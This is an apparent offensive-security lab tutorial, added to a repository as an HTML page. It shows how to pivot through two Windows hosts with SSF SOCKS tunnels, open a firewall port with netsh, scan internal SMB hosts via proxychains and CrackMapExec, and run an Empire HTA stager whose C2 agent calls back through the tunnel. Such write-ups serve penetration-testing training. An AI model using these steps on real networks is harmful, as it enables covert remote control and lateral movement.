@@ -1,1 +1,300 @@
 
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+    <title>C2 n*hop with ssf</title>
+    <style>
+    pre {
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  text-align: justify;
+  background: #e8e8e8;
+  padding: 5px;
+}
+p {
+    margin-bottom: 0.8rem;
+}
+</style>
+</head>
+<body>
+    <div class="container grid-lg">
+        <div class="columns">
+          <div class="column">
+
+                <h1>Sovling double hop with ssf - SOCKS/C2</h1>
+
+                <p class="justify">My solution to solve multiple hop using <a href="https://securesocketfunneling.github.io/ssf/#home">SSF</a>. First we start with three servers, imagine we want to reach the server 3 (192.168.152.102) from our Kali (192.168.133.156). We need to setup a socks tunnel between server 2 and our kali but we also want to execute your Empire agent on server2. Let's solve this situation !</p>
+                <div style="text-align: center;"><img src="G:\sdfsdf.png" alt="" class="centered"></div><br>
+
+                <p><b>Note</b>: You need to have local administrator privilege on server 1 in order to allow connection on port 5000.</p>
+
+                <h5>Creating a remote SOCKS between Server 1 and Kali</h5>
+
+                <div style="text-align: center;"><img src="G:\sdfsdf (1).png" alt="" class="centered"></div><br>
+
+
+                <p> First we start the ssd server on Kali:</p>
+                <pre style="font-size:11px">
+┌──(mpgn㉿kali)-[~/ssf-linux-x86_64-3.0.0]
+└─$ sudo ./ssfd -p 1337
+[2021-03-02T08:12:02-05:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
+[2021-03-02T08:12:02-05:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
+[2021-03-02T08:12:02-05:00] [info] [config] [tls] key path: <file: ./certs/private.key>
+[2021-03-02T08:12:02-05:00] [info] [config] [tls] key password: <>
+[2021-03-02T08:12:02-05:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
+[2021-03-02T08:12:02-05:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
+[2021-03-02T08:12:02-05:00] [info] [config] [http proxy] <None>
+[2021-03-02T08:12:02-05:00] [info] [config] [socks proxy] <None>
+[2021-03-02T08:12:02-05:00] [info] [config] [circuit] <None>
+[2021-03-02T08:12:02-05:00] [info] [ssfd] listening on <*:1337>
+[2021-03-02T08:12:02-05:00] [info] [ssfd] running (Ctrl + C to stop)
+</pre>
+                <p> On Server 1 we use ssf to open a remote socks and connect it to the ssfd server (on kali). We use the option <code>-F port</code> to open a remote socks</p>
+                <pre style="font-size:11px">
+C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssf.exe -F 1080 -p 1337 192.168.133.156
+[2021-02-28T12:37:19-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
+[2021-02-28T12:37:19-08:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
+[2021-02-28T12:37:19-08:00] [info] [config] [tls] key path: <file: ./certs/private.key>
+[2021-02-28T12:37:19-08:00] [info] [config] [tls] key password: <>
+[2021-02-28T12:37:19-08:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
+[2021-02-28T12:37:19-08:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
+[2021-02-28T12:37:19-08:00] [info] [config] [http proxy] <None>
+[2021-02-28T12:37:19-08:00] [info] [config] [socks proxy] <None>
+[2021-02-28T12:37:19-08:00] [info] [config] [circuit] <None>
+[2021-02-28T12:37:19-08:00] [info] [ssf] connecting to <192.168.133.156:443>
+[2021-02-28T12:37:19-08:00] [info] [ssf] running (Ctrl + C to stop)
+[2021-02-28T12:37:19-08:00] [info] [client] connection attempt 1/1
+[2021-02-28T12:37:19-08:00] [info] [client] connected to server
+[2021-02-28T12:37:19-08:00] [info] [client] running
+[2021-02-28T12:37:19-08:00] [info] [microservice] [socks]: start server on fiber port 1080
+[2021-02-28T12:37:19-08:00] [info] [client] service <remote-socks> OK</pre>
+
+                <p> On our Kali a line should appear on the server ssfd:</p>
+                <pre style="font-size:11px">
+[2021-03-02T08:12:14-05:00] [info] [microservice] [stream_listener]: forward TCP connections from <127.0.0.1:1080> to 1080</pre>
+
+                <p>Now using proxychains we can configure the socks proxy like this:</p>
+                <pre style="font-size:11px">
+vim /etc/proxychains.conf
+
+...
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 1080 </pre>
+                <p> And then we can use CrackMapExec to connect to the server 2</p>
+                <pre style="font-size:11px">
+┌──(mpgn㉿kali)-[~]
+└─$ proxychains crackmapexec smb 192.168.151.102
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.151.102:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.151.102:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.151.102:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.151.102:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.151.102:445  ...  OK
+SMB         192.168.151.102 445    DESKTOP-BQC6FMA  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-BQC6FMA) (domain:poudlard.wizard) (signing:False) (SMBv1:False)
+</pre>
+
+<p><b>Note</b>: No need to be local admin for this part of course.</p>
+                <h5>Creating a remote SOCKS between Server 2 and Kali</h5>
+
+                <div style="text-align: center;"><img src="G:\sdfsdf (2).png" alt="" class="centered"></div><br>
+
+<p>Now let's open a socks between server 2 and our Kali. First we open a ssf server on port 5000 on Server 1:</p>
+<pre style="font-size:11px">
+C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssfd.exe -p 5000
+[2021-03-02T02:23:25-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
+[2021-03-02T02:23:25-08:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
+[2021-03-02T02:23:25-08:00] [info] [config] [tls] key path: <file: ./certs/private.key>
+[2021-03-02T02:23:25-08:00] [info] [config] [tls] key password: <>
+[2021-03-02T02:23:25-08:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
+[2021-03-02T02:23:25-08:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
+[2021-03-02T02:23:25-08:00] [info] [config] [http proxy] <None>
+[2021-03-02T02:23:25-08:00] [info] [config] [socks proxy] <None>
+[2021-03-02T02:23:25-08:00] [info] [config] [circuit] <None>
+[2021-03-02T02:23:25-08:00] [info] [ssfd] listening on <*:5000>
+[2021-03-02T02:23:25-08:00] [info] [ssfd] running (Ctrl + C to stop)
+</pre>
+        <p>And then you need to allow connection to the port 5000 by adding this firewall rules:</p>
+
+<pre style="font-size:11px; background: #ffd9d9;">
+C:\Windows\system32>netsh advfirewall firewall add rule name="TCP Port 6624" dir=in action=allow protocol=TCP localport=5000
+    Ok.
+</pre>
+
+        <p>Then we need to configure a path to tell ssf on Server 2 to use the port 5000 on server 1 to connect to our kali. It's actually very simple, just add the following code in a file.</p>
+<pre style="font-size:11px">
+C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>type config.txt
+{
+    "ssf": {
+        "circuit": [
+        {"host": "192.168.151.102", "port":"5000"}
+        ]
+    }
+}
+C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssf.exe -F 1081 -c config.txt -p 1338 192.168.133.156
+[2021-03-02T06:08:04-08:00] [info] [config] loading file <config.txt>
+[2021-03-02T06:08:04-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
+[2021-03-02T06:08:04-08:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
+[2021-03-02T06:08:04-08:00] [info] [config] [tls] key path: <file: ./certs/private.key>
+[2021-03-02T06:08:04-08:00] [info] [config] [tls] key password: <>
+[2021-03-02T06:08:04-08:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
+[2021-03-02T06:08:04-08:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
+[2021-03-02T06:08:04-08:00] [info] [config] [http proxy] <None>
+[2021-03-02T06:08:04-08:00] [info] [config] [socks proxy] <None>
+[2021-03-02T06:08:04-08:00] [info] [config] [circuit] 1. <192.168.151.102:5000>
+[2021-03-02T06:08:04-08:00] [info] [ssf] connecting to <192.168.133.156:1338>
+[2021-03-02T06:08:04-08:00] [info] [ssf] running (Ctrl + C to stop)
+[2021-03-02T06:08:04-08:00] [info] [client] connection attempt 1/1
+[2021-03-02T06:08:04-08:00] [info] [client] connected to server
+[2021-03-02T06:08:04-08:00] [info] [client] running
+</pre>
+            <p>On our kali we should see this new line pop:</p>
+<pre style="font-size:11px">
+[2021-03-02T09:11:58-05:00] [info] [microservice] [stream_listener]: forward TCP connections from <127.0.0.1:1081> to 1081</pre>
+            <p>Now copy the proxychains conf and modify it with port 1081 then we can target Server 3 without any problem using the proxy socks !</p>
+<pre style="font-size:11px">
+┌──(mpgn㉿kali)-[~]
+└─$  copy /etc/proxychains.conf /tmp/proxychains-152.conf
+┌──(mpgn㉿kali)-[~]
+└─$ vim /tmp/proxychains-152.conf
+    
+    ...
+    [ProxyList]
+    # add proxy here ...
+    # meanwile
+    # defaults set to "tor"
+    socks5 127.0.0.1 1081
+
+┌──(mpgn㉿kali)-[~]
+└─$ proxychains -f /tmp/proxychains-152.conf  crackmapexec smb 192.168.152.102
+[proxychains] config file found: /tmp/proxychains-152.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.152.102:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.152.102:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.152.102:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.152.102:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.152.102:445  ...  OK
+SMB         192.168.152.102 445    MSEDGEWIN10      [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10) (domain:MSEDGEWIN10) (signing:False) (SMBv1:False)
+</pre>
+
+
+                <h5>Executing our Empire agent on Server 2</h5>
+
+                <div style="text-align: center;"><img src="G:\sdfsdf (3).png" alt="" class="centered"></div><br>
+
+                <p>Now if you want to get your Empire agent running on Server 2 you need to create a new listener (notice the host 127.0.0.1)</p>
+<pre style="font-size:11px">
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > info
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  Name              True        http1                            Name for the listener.
+  Host              True        http://127.0.0.1:4443            Hostname/IP for staging.
+  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
+  Port              True        4443                             Port for the listener.
+.....
+</pre>
+                <p>Then generate an agent ready to use on Empire and set the Listener to the previous one you created:</p>
+<pre style="font-size:11px">
+(Empire: agents) > usestager windows/hta
+(Empire: stager/windows/hta) > info
+
+Name: HTA
+
+Description:
+    Generates an HTA (HyperText Application) For
+    Internet Explorer
+
+Options:
+
+    Name             Required    Value             Description
+    ----             --------    -------           -----------
+    Listener         True        http1             Listener to generate stager for.
+    Language         True        powershell        Language of the stager to generate.
+</pre>
+                <p>Before executing our agent we need to kill our previous ssf connection on Server 2 and add some options to enable port forwarding</p>
+<pre style="font-size:11px">
+C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssf.exe -c config.txt -L 4443:192.168.133.156:4443 -p 1338 192.168.133.156 -F 1081
+[2021-03-02T06:36:22-08:00] [info] [config] loading file <config.txt>
+[2021-03-02T06:36:22-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
+[2021-03-02T06:36:22-08:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
+[2021-03-02T06:36:22-08:00] [info] [config] [tls] key path: <file: ./certs/private.key>
+[2021-03-02T06:36:22-08:00] [info] [config] [tls] key password: <>
+[2021-03-02T06:36:22-08:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
+[2021-03-02T06:36:22-08:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
+[2021-03-02T06:36:22-08:00] [info] [config] [http proxy] <None>
+[2021-03-02T06:36:22-08:00] [info] [config] [socks proxy] <None>
+[2021-03-02T06:36:22-08:00] [info] [config] [circuit] 1. <192.168.151.102:5000>
+[2021-03-02T06:36:22-08:00] [info] [ssf] connecting to <192.168.133.156:1338>
+[2021-03-02T06:36:22-08:00] [info] [ssf] running (Ctrl + C to stop)
+[2021-03-02T06:36:22-08:00] [info] [client] connection attempt 1/1
+[2021-03-02T06:36:22-08:00] [info] [client] connected to server
+[2021-03-02T06:36:22-08:00] [info] [client] running
+[2021-03-02T06:36:22-08:00] [info] [microservice] [socks]: start server on fiber port 1081
+[2021-03-02T06:36:22-08:00] [info] [client] service <remote-socks> OK
+[2021-03-02T06:36:22-08:00] [info] [microservice] [stream_listener]: forward TCP connections from <127.0.0.1:4443> to 4443
+[2021-03-02T06:36:22-08:00] [info] [client] service <tcp-forward> OK    
+</pre>
+
+                <p>Now just run your stager and you should see the agent pop in Empire</p>
+<pre style="font-size:11px">
+[*] Sending POWERSHELL stager (stage 1) to 192.168.133.156                                                                                                   
+[*] New agent D816BHAY checked in
+[+] Initial agent D816BHAY from 192.168.133.156 now active (Slack)
+[*] Sending agent (stage 2) to D816BHAY at 192.168.133.156
+
+(Empire: stager/windows/hta) > interact D816BHAY
+(Empire: D816BHAY) > shell whoami
+[*] Tasked D816BHAY to run TASK_SHELL
+[*] Agent D816BHAY tasked with task ID 1
+(Empire: D816BHAY) > 
+poudlard\harry
+
+..Command execution completed.
+
+(Empire: D816BHAY) > shell ipconfig
+[*] Tasked D816BHAY to run TASK_SHELL
+[*] Agent D816BHAY tasked with task ID 2
+(Empire: D816BHAY) > 
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+    Connection-specific DNS Suffix  . : 
+    IPv4 Address. . . . . . . . . . . : 192.168.151.102
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+    Default Gateway . . . . . . . . . : 192.168.151.100
+
+Ethernet adapter Ethernet1:
+
+    Connection-specific DNS Suffix  . : 
+    IPv4 Address. . . . . . . . . . . : 192.168.152.101
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+    Default Gateway . . . . . . . . . : 192.168.152.100
+
+..Command execution completed.
+
+(Empire: D816BHAY) > 
+</pre>                
+
+                <h5>Creating a remote SOCKS between server n and Kali</h5>
+                <p>On each servers you need to run the command <code>ssfd.exe -p 5000</code>, you also need to open the port 5000 on the firewall to allow the connection meaning you need administrative privileges.</p>
+          </div>
+        </div>
+    </div>
+</body>
+</html>
